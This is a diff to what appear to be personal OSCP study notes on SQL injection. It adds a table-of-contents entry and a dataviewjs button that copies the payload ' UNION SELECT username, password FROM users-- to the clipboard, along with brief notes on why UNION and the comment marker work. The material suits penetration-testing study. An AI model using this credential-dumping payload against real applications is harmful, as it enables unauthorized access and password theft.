@@ -8,6 +8,8 @@
 | ------------------------------ | ----- |
 | [[#🧠 SQL Injection Payloads]] |       |
 | [[#MSSQL RCE]]                 |       |
+| [[#Union Injection]]           |       |
+|                                |       |
 
 4 Databases RCE
 https://medium.com/@0x3adly/from-sql-injection-to-rce-leveraging-vulnerability-for-maximum-impact-2fb356907eed
@@ -486,7 +488,6 @@ button.addEventListener("click", async () => {
 ```
 
 ---
-
 #### Errors as hints
 
 Learn to recognise database fingerprints in error messages.
@@ -1416,11 +1417,47 @@ Continue incrementing until the query errors or the response changes significant
 Then investigate whether the column types and output locations are compatible with the application's original query.  
   
 Don't assume that the number of visible fields on the webpage equals the number of columns in the underlying query.  
-  
+
+Show original query, but also show username and passwords columns from table users at the same time
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+
+const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const IP = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `' UNION SELECT username, password FROM users--`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(command);
+        button.textContent = "Copied!";
+        setTimeout(() => button.textContent = command, 250);
+    } catch {
+        button.textContent = "Copy failed";
+    }
+});
+```
+1. Why use UNION? DB might only show results of first query. UNION them so DB shows both.
+2. Why use --, to comment out the extra ' syntax behind that might break it
   
 ---  
   
-6. Identify the database engine  
+####  Identify the database engine  
   
 Database identification matters because MySQL, MSSQL, PostgreSQL, Oracle, and SQLite have different syntax, functions, error behavior, and capabilities.  
   
